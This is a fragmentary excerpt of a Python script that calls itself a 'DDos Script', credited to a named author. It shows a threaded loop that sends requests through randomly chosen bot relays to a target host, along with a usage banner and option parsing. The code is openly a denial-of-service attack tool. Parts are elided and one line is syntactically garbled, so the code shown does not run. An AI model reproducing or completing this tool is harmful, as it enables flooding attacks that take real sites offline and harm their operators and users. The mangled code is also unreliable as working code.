...
# python 3.3.2+ DDos DDos Script v.1
# by Can Yalçın
...
def DDos2():
	while True:
		item=w.get()
		bot_DDosrandom.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	DDosipt v.1 http://www.canyalcin.com/
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="DDoss")
